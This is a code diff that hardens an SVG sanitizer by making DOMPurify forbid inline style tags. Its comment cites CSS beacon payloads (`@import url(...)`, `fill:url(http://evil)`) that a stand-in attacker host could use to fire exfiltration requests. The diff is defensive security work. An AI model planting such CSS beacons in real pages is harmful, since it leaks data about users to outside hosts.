@@ -11,7 +11,16 @@ import DOMPurify from 'dompurify';
  *  SVG — uploaded files AND public-feed rows (RLS can't parse SVG, so
  *  sanitize-on-read is the enforceable XSS layer). */
 export function sanitizeSvgMarkup(markup: string): string {
-  return DOMPurify.sanitize(markup, { USE_PROFILES: { svg: true, svgFilters: true } });
+  // FORBID_TAGS: ['style'] closes a real exfil hole the SVG profile leaves open —
+  // DOMPurify keeps inline <style>, so `@import url(...)` / `fill:url(http://evil)`
+  // survive and the browser fires the request on inject (a CSS request/exfil
+  // beacon). Proven by tools/security/security-battery.mjs (style-import-beacon /
+  // style-url-background). Safe to forbid: Desk Doodles art is pure geometry with
+  // inline attrs (rough.js / smartHachure / perfect-freehand) — never inline <style>.
+  return DOMPurify.sanitize(markup, {
+    USE_PROFILES: { svg: true, svgFilters: true },
+    FORBID_TAGS: ['style'],
+  });
 }
 
 export type SvgUploadResult =
